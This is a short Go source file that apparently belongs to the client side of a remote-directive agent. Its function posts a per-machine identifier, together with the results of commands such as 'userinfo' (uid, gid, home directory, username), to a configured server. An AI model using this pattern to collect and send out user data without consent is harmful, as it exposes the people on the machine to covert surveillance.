package crossplatform

import (
	"corpotecht_client/config"
	"corpotecht_client/utils"
	"net/http"
	"net/url"
	"strings"
)

/*
Sample of params sent to server

{
	"Identifier": "XXXXXXXX",
	"Directive": "userinfo",
    "gid": "1000",
    "homedir": "/home/username",
    "name": "Person",
    "uid": "1000",
    "username": "username"
}

*/

func SendDirectiveResponse(payload url.Values) {
	// add Identifier to payload
	payload.Add("Identifier", utils.GetUniqueIdentifier())

	client := &http.Client{}
	request, err := http.NewRequest("POST", config.PostResultEndpoint, strings.NewReader(payload.Encode()))
	utils.HandleError(err)

	headers := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"Accept":       "*/*",
	}
	for key, value := range headers {
		request.Header.Add(key, value)
	}

	_, err = client.Do(request)
	utils.HandleError(err)
}
